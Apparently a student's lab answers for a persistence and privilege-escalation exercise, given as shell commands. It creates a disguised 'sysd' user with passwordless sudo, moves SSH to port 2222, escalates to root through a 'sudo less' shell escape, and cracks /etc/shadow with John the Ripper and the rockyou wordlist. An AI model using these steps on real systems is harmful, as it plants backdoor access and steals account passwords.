# Unit 6
## Justin Cremer

### Step 1

1. sudo useradd -M sysd 
2. sudo passwd sysd 
3. sudo usermod -u 1020 sysd 
4. sudo groupmod -g 1020 sysd 
5. sudo usermod -aG sudo sysd \
   sudo visudo 
   [append :: sysd ALL=(ALL) NOPASSWD:ALL] 
6. su sysd \
   sudo -l

### Step 2

1. sudo nano /etc/ssh/sshd_config \
   [append :: Port 2222]

### Step 3

1. sudo systemctl restart sshd.service 
2. exit 
3. ssh sysd@[ip address] -p 2222 
4. sudo less [any file] \
   !/bin/bash \
   su root

### Step 4

1. [same as in last step] 
2. cd ~/CTF && wget https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt \
   john --wordlist=/home/student/CTF/rockyou.txt /etc/shadow \
   john --show /etc/shadow

